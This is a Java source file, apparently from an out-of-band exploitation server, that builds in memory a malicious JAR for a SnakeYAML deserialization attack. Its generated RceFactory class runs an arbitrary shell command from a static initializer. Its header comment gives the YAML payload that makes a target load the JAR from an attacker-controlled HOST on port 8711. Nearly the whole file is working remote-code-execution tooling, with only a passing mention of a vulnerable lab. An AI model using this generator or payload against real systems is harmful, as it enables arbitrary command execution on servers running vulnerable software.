package com.oobx.chains;

import javassist.*;
import org.springframework.stereotype.Component;

import java.io.*;
import java.util.jar.*;

/**
 * Generates a SnakeYAML SPI attack JAR in memory.
 *
 * The JAR contains:
 *   - com/oobx/RceFactory.class  — implements javax.script.ScriptEngineFactory;
 *     static initializer calls Runtime.exec(cmd)
 *   - META-INF/services/javax.script.ScriptEngineFactory  — lists com.oobx.RceFactory
 *
 * SnakeYAML payload:
 *   !!javax.script.ScriptEngineManager
 *     [!!java.net.URLClassLoader [[!!java.net.URL ["http://HOST:8711/spi-jar?cmd=CMD"]]]]
 */
@Component
public class SpiJarHandler {

    public byte[] generateSpiJar(String cmd) throws Exception {
        ClassPool cp = new ClassPool(ClassPool.getDefault());
        try {
            cp.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
        } catch (Exception ignored) {}

        // Detach any previously generated class to allow regeneration
        CtClass existing = cp.getOrNull("com.oobx.RceFactory");
        if (existing != null) existing.detach();

        CtClass rceClass = cp.makeClass("com.oobx.RceFactory");

        // Implement javax.script.ScriptEngineFactory
        CtClass factoryInterface = cp.get("javax.script.ScriptEngineFactory");
        rceClass.addInterface(factoryInterface);

        // Static initializer — exec cmd
        String safeCmd = cmd.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ");
        rceClass.makeClassInitializer().setBody(
            "try { Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + safeCmd + "\"}); } catch (Exception e) {}"
        );

        // Stub implementations for all ScriptEngineFactory interface methods
        String[] stubs = {
            "public String getEngineName() { return \"rce\"; }",
            "public String getEngineVersion() { return \"1.0\"; }",
            "public java.util.List getExtensions() { return new java.util.ArrayList(); }",
            "public java.util.List getMimeTypes() { return new java.util.ArrayList(); }",
            "public java.util.List getNames() { return new java.util.ArrayList(); }",
            "public String getLanguageName() { return \"rce\"; }",
            "public String getLanguageVersion() { return \"1.0\"; }",
            "public Object getParameter(String key) { return null; }",
            "public String getMethodCallSyntax(String obj, String m, String[] args) { return \"\"; }",
            "public String getOutputStatement(String toDisplay) { return \"\"; }",
            "public String getProgram(String[] statements) { return \"\"; }",
            "public javax.script.ScriptEngine getScriptEngine() { return null; }",
        };
        for (String stub : stubs) {
            rceClass.addMethod(CtNewMethod.make(stub, rceClass));
        }

        // Target Java 8 class file version (52) so it loads on vulnlab JDK 8
        rceClass.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
        rceClass.getClassFile().setMinorVersion(0);
        byte[] classBytes = rceClass.toBytecode();
        rceClass.detach();

        // Build JAR in memory
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (JarOutputStream jos = new JarOutputStream(baos)) {
            jos.putNextEntry(new JarEntry("com/oobx/RceFactory.class"));
            jos.write(classBytes);
            jos.closeEntry();

            jos.putNextEntry(new JarEntry("META-INF/services/javax.script.ScriptEngineFactory"));
            jos.write("com.oobx.RceFactory\n".getBytes("UTF-8"));
            jos.closeEntry();
        }
        return baos.toByteArray();
    }
}
